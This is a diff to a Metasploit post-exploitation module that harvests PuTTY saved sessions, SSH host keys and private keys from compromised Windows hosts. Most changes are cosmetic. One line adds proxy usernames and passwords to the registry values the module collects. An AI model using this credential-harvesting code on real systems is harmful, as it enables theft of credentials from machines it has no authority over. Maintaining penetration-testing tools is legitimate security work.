@@ -1,12 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
-require 'msf/core/post/windows/priv'
-require 'msf/core/post/common'
-require 'msf/core/post/windows/registry'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
@@ -14,7 +9,7 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Registry
 
-  INTERESTING_KEYS = ['HostName', 'UserName', 'PublicKeyFile', 'PortNumber', 'PortForwardings']
+  INTERESTING_KEYS = ['HostName', 'UserName', 'PublicKeyFile', 'PortNumber', 'PortForwardings','ProxyUsername','ProxyPassword']
   PAGEANT_REGISTRY_KEY = "HKCU\\Software\\SimonTatham\\PuTTY"
   PUTTY_PRIVATE_KEY_ANALYSIS = ['Name', 'HostName', 'UserName', 'PublicKeyFile', 'Type', 'Cipher', 'Comment']
 
@@ -72,7 +67,7 @@ class MetasploitModule < Msf::Post
     print_line
     print_line results_table.to_s
     stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
-    print_status("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
+    print_good("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
   end
 
   def display_private_key_analysis(info)
@@ -95,7 +90,7 @@ class MetasploitModule < Msf::Post
     print_line
     print_line results_table.to_s
     # stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
-    # print_status("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
+    # print_good("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
   end
 
   def get_stored_host_key_details(allkeys)
@@ -155,7 +150,7 @@ class MetasploitModule < Msf::Post
     print_line
     print_line results_table.to_s
     stored_path = store_loot('putty.storedfingerprints.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Stored SSH Host Keys List")
-    print_status("PuTTY stored host keys list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).")
+    print_good("PuTTY stored host keys list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).")
   end
 
   def grab_private_keys(sessions)
